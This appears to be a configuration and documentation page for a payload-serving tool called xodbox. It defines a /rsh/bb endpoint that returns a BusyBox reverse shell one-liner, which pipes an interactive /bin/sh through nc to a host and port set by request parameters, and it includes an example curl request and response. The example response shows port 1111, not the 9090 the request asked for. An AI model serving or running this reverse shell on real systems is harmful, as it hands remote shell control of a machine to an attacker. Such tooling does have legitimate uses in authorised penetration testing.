---
title: BusyBox Reverse Shell
description: BusyBox Reverse Shell
weight: 1
pattern: /rsh/bb$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    {{- $client := index .Request.RemoteAddr 0}}
    {{- $clientSplit := split ":" $client }}
    {{- $connectHost := $clientSplit._0 }}
    {{- $connectPort := 9091 }}
    {{- if .Request.GetParams.h }}
    {{- $connectHost = (index .Request.GetParams.h 0) }} 
    {{- end -}}
    {{- if .Request.GetParams.p }}
    {{- $connectPort = (index .Request.GetParams.p 0) }} 
    {{- end -}}
    rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {{ $connectHost }} {{ $connectPort }} >/tmp/f

---


Useful for reverse shells on busybox systems.

### Example Request

Params

| Parameter | Default Value     | Description        |
|-----------|-------------------|--------------------|
| h         | Client IP address | Host to connect to |
| p         | 9091              | Port to connect to |


```bash
curl -i "http://xodbox.test/rsh/bb?h=10.10.10.10&p=9090"
```

### Example Response

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1111 >/tmp/f
```
